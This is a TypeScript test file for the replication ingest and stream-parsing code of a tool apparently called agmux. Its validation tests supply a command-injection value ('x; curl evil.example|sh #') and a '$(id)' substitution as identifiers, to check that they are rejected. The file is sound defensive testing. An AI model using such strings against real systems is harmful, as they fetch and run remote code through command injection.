import { describe, expect, test } from "bun:test";
import { REPLICATION_VERSION } from "@agmux/protocol";
import { Store } from "@agmux/store";
import { checkHeader, ingestReplicated, parseStreamLine } from "../src/sync/ingest.ts";

const HOST = "gw/sbx";
const TS = "2026-06-08T00:00:00.000Z";
const SID = "0190a3e0-0000-7000-8000-000000000001";
const DB = "db-1";
let n = 0;

function registered(sid: string, host: string, payload: Record<string, unknown> = {}): any {
  return {
    event_id: "e" + ++n, ts: TS, session_id: sid, kind: "session.registered", version: 1, host,
    payload: { agent_kind: "claude", tmux_session: "main", tmux_window: "1", tmux_pane: "%3",
      cwd: "/tmp", profile: null, agent_version: null, parent: null, native_session_id: "nat-1", pid: 42, ...payload },
  };
}
const rec = (ev: any) => ({ id: 1, ev });

describe("ingestReplicated", () => {
  test("accepts a valid record and stores source = expectedHost", () => {
    const s = Store.openInMemory();
    expect(ingestReplicated(s, rec(registered(SID, HOST)), HOST, DB)).toEqual({ ok: true, appended: true });
    expect(s.sessionHost(SID)).toBe(HOST);
    const src = s.rawDb().query<{ source: string | null; source_db: string | null }, []>("SELECT source, source_db FROM events").all();
    expect(src).toEqual([{ source: HOST, source_db: DB }]);
  });
  test("duplicate event_id is not appended twice", () => {
    const s = Store.openInMemory();
    const ev = registered(SID, HOST);
    ingestReplicated(s, rec(ev), HOST, DB);
    expect(ingestReplicated(s, rec(ev), HOST, DB)).toEqual({ ok: true, appended: false });
  });
  test("rejects host mismatch", () => {
    const r = ingestReplicated(Store.openInMemory(), rec(registered(SID, "144190573f15")), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("host mismatch")).toBe(true);
  });
  test("rejects an event naming a session of another host", () => {
    const s = Store.openInMemory();
    s.append(registered(SID, "mac.local"));
    const r = ingestReplicated(s, rec(registered(SID, HOST, { native_session_id: "nat-2" })), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("foreign session")).toBe(true);
    expect(s.sessionHost(SID)).toBe("mac.local");
  });
  test("rejects host.* kinds", () => {
    const ev = { ...registered(SID, HOST), kind: "host.synced" };
    const r = ingestReplicated(Store.openInMemory(), rec(ev), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("host event")).toBe(true);
  });
  test("rejects an invalid envelope", () => {
    const r = ingestReplicated(Store.openInMemory(), rec({ kind: "x" }), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("invalid envelope")).toBe(true);
  });
  test("rejects a session_id that is not a canonical UUID (shell metacharacters)", () => {
    const s = Store.openInMemory();
    for (const sid of ["x; curl evil.example|sh #", "0190a3e0-0000-7000-8000-000000000001'", "00000000-0000-0000-0000-000000000000"]) {
      const r = ingestReplicated(s, rec(registered(sid, HOST)), HOST, DB);
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.reason.startsWith("invalid envelope: session_id")).toBe(true);
    }
    expect(s.rawDb().query("SELECT COUNT(*) AS n FROM events").get()).toEqual({ n: 0 });
  });
  test("rejects an event_id outside [A-Za-z0-9-]{1,64}", () => {
    const s = Store.openInMemory();
    for (const id of ["a b", "x$(id)", "e".repeat(65)]) {
      const r = ingestReplicated(s, rec({ ...registered(SID, HOST), event_id: id }), HOST, DB);
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.reason.startsWith("invalid envelope: event_id")).toBe(true);
    }
    expect(ingestReplicated(s, rec({ ...registered(SID, HOST), event_id: "01JAXYZ0000000000000000000" }), HOST, DB).ok).toBe(true);
  });
  test("rejects an invalid known payload", () => {
    const r = ingestReplicated(Store.openInMemory(), rec(registered(SID, HOST, { native_session_id: undefined })), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("invalid payload")).toBe(true);
  });
  test("append failure (UNIQUE in projection) rejects instead of throwing", () => {
    const s = Store.openInMemory();
    expect(ingestReplicated(s, rec(registered(SID, HOST)), HOST, DB).ok).toBe(true);
    const r = ingestReplicated(s, rec(registered("0190a3e0-0000-7000-8000-000000000009", HOST)), HOST, DB);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.startsWith("append failed")).toBe(true);
  });
  test("reasons lose control characters and are truncated", () => {
    const s = Store.openInMemory();
    const a = ingestReplicated(s, rec(registered(SID, "\x1b[31mevil")), HOST, DB);
    expect(a.ok).toBe(false);
    if (!a.ok) expect(a.reason).not.toMatch(/[\u0000-\u001f\u007f]/);
    const b = ingestReplicated(s, rec(registered(SID, "h".repeat(1000))), HOST, DB);
    expect(b.ok).toBe(false);
    if (!b.ok) expect(b.reason.length).toBeLessThanOrEqual(300);
  });
  test("stores an unknown kind raw", () => {
    const ev = { ...registered(SID, HOST), kind: "future.thing", payload: { a: 1 } };
    expect(ingestReplicated(Store.openInMemory(), rec(ev), HOST, DB)).toEqual({ ok: true, appended: true });
  });
});

describe("parseStreamLine", () => {
  test("header", () => {
    const header = { replication: 1, agmux: "0.1.0", db_id: "d", host: HOST };
    expect(parseStreamLine(JSON.stringify(header))).toEqual({ type: "header", header });
  });
  test("record", () => {
    const r = { id: 3, ev: registered(SID, HOST) };
    expect(parseStreamLine(JSON.stringify(r))).toEqual({ type: "record", record: r });
  });
  test("keepalive", () => {
    expect(parseStreamLine(JSON.stringify({ keepalive: TS }))).toEqual({ type: "keepalive" });
  });
  test("garbage and malformed", () => {
    for (const l of ["not json", "[]", "null", "{}", JSON.stringify({ ev: {} }), JSON.stringify({ id: 0, ev: {} }),
      JSON.stringify({ id: 1.5, ev: {} }), JSON.stringify({ id: 1, ev: "x" }),
      JSON.stringify({ replication: 0, agmux: "a", db_id: "d", host: "h" }),
      JSON.stringify({ replication: 1, agmux: "a", db_id: "d" })]) {
      expect(parseStreamLine(l).type).toBe("invalid");
    }
  });
});

describe("checkHeader", () => {
  const h = { replication: 1, agmux: "0.1.0", db_id: "d", host: "144190573f15" };
  test("mismatch text", () => {
    expect(checkHeader(h, HOST)).toEqual({ ok: false,
      error: 'sandbox stamps host "144190573f15", expected "gw/sbx" — create the sandbox with --env AGMUX_HOST=gw/sbx' });
  });
  test("ok and newer", () => {
    expect(checkHeader({ ...h, host: HOST }, HOST)).toEqual({ ok: true, newer: false });
    expect(checkHeader({ ...h, host: HOST, replication: REPLICATION_VERSION + 1 }, HOST)).toEqual({ ok: true, newer: true });
  });
});
